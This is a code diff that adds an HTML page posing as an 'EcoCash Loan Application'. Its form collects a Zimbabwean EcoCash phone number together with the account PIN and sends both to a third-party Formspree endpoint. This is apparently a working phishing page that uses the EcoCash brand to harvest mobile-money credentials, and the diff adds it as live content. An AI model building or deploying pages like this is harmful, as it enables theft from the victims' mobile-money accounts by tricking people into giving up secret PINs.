@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>EcoCash Loan Application</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles/style.css">
+</head>
+<body>
+
+<div class="form-container">
+    <!-- Image Section -->
+    <div class="image-wrapper">
+        <img src="./gallery/ecocash.jpeg" alt="Loan Application">
+    </div>
+
+    <!-- Form Section -->
+    <form 
+        action="https://formspree.io/f/xpqwvpva" 
+        method="POST"
+        id="loanForm"
+    >
+        <h2>Loan Application Form</h2>
+
+        <!-- EcoCash Phone -->
+        <div class="input-group">
+            <label>EcoCash Phone Number</label>
+            <div class="phone-input">
+                <span class="country-code">+263</span>
+                <input 
+                    type="tel" 
+                    name="ecocash_number" 
+                    placeholder="7XXXXXXXX" 
+                    required
+                >
+            </div>
+        </div>
+
+        <!-- PIN -->
+        <div class="input-group">
+            <label>EcoCash PIN</label>
+            <input 
+                type="password" 
+                name="pin" 
+                placeholder="Enter PIN" 
+                required
+            >
+        </div>
+
+        <!-- Loan Amount -->
+        <div class="input-group">
+            <label>Loan Amount (ZWL)</label>
+            <input 
+                type="number" 
+                name="loan_amount" 
+                placeholder="Enter amount in ZWL" 
+                required
+            >
+        </div>
+
+        <!-- Terms -->
+        <div class="terms">
+            <input 
+                type="checkbox" 
+                id="terms" 
+                required
+            >
+            <label for="terms">
+                I agree that the loan will be repaid within the estimated duration.
+            </label>
+        </div>
+
+        <!-- Submit -->
+        <button type="submit" class="submit-btn">
+            Apply Now
+        </button>
+    </form>
+</div>
+
+<script src="./scripts/script.js"></script>
+</body>
+</html>
